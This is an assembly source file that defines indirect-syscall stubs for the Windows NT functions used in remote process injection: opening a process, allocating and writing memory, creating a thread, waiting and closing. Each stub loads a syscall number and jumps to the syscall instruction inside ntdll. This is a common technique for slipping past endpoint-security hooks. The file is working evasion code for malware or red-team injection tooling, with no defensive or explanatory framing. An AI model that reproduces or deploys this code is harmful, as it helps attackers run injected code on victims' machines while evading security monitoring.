; syscalls.asm - NASM x64, COFF format, INDIRECT syscalls
; Assemble: nasm -f win64 syscalls.asm -o syscalls.o

section .data
    ; External variables from C (SSN + address of syscall instruction in ntdll)
    extern NtCloseSSN, NtCloseSyscall
    extern NtOpenProcessSSN, NtOpenProcessSyscall
    extern NtCreateThreadExSSN, NtCreateThreadExSyscall
    extern NtWriteVirtualMemorySSN, NtWriteVirtualMemorySyscall
    extern NtWaitForSingleObjectSSN, NtWaitForSingleObjectSyscall
    extern NtAllocateVirtualMemorySSN, NtAllocateVirtualMemorySyscall

section .text
    default rel                     ; RIP-relative addressing (fixes NASM warning)
    global NtOpenProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory
    global NtCreateThreadEx, NtWaitForSingleObject, NtClose

; ─────────────────────────────────────────
; INDIRECT SYSCALL: Jump to the real syscall instruction in ntdll
; The syscall instruction in ntdll already has the SSN encoded,
; so we just prepare registers and jump.

NtOpenProcess:
    mov r10, rcx                          ; syscall convention: 1st arg → r10
    ; Optional: set eax to SSN (not strictly needed for indirect, but harmless)
    mov eax, dword [NtOpenProcessSSN]
    jmp qword [NtOpenProcessSyscall]      ; INDIRECT: jump to syscall instruction in ntdll
    ; ret is never reached (jmp transfers control)

NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, dword [NtAllocateVirtualMemorySSN]
    jmp qword [NtAllocateVirtualMemorySyscall]

NtWriteVirtualMemory:
    mov r10, rcx
    mov eax, dword [NtWriteVirtualMemorySSN]
    jmp qword [NtWriteVirtualMemorySyscall]

NtCreateThreadEx:
    mov r10, rcx
    mov eax, dword [NtCreateThreadExSSN]
    jmp qword [NtCreateThreadExSyscall]

NtWaitForSingleObject:
    mov r10, rcx
    mov eax, dword [NtWaitForSingleObjectSSN]
    jmp qword [NtWaitForSingleObjectSyscall]

NtClose:
    mov r10, rcx
    mov eax, dword [NtCloseSSN]
    jmp qword [NtCloseSyscall]